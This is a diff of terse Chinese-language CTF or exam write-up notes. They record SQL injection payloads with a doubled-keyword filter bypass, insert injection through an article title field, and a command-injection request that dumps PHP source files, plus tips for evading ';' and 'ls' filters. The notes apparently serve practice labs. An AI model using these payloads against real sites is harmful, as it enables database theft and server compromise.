@@ -34,7 +34,7 @@ admin'%20anandd%20subsubstrstr((selselectect%20group_concat(id%2c%22%3a%22%2cuse
 [嘤嘤嘤]insertsql #SQL注入漏洞 
 insert注入，查看页面，有上传文章的功能
 ![[Pasted image 20240329124443.png]]
-尝试在标题注入，其显示上传失败，并快速重定向至主页面，但是显示了一瞬间的sql语句，打开BP的intercept,显示出了其使用的sql语句：
+尝试在标题注入，其显示上传失败，并快速重定向至主页面，但是显示了一瞬间的sql语句，打开BP的intercept,显示出了其使用的sql语句： ^d26139
 ```
 insert into article(title,author,description,content,dateline) values('114514' and 1=2#','114514','114514','114514',1711687035)
 ```
@@ -183,3 +183,12 @@ cmd参数长度小于30执行cmd但不回显。
 GET /start/vul.php?cmd=echo+"`cat+../a*/*.php`">1.txt
 ```
 [嘤嘤嘤]P3_5
+命令执行
+过滤了; ls php使用&& 变量 通配符绕过。
+[嘤嘤嘤]P4_1
+有文章上传功能，是insert注入和[[EXAM特供WP#^d26139]]一样
+```
+insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
+```
+insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
+1','114514','114514','114514',14141414)# --+ %23
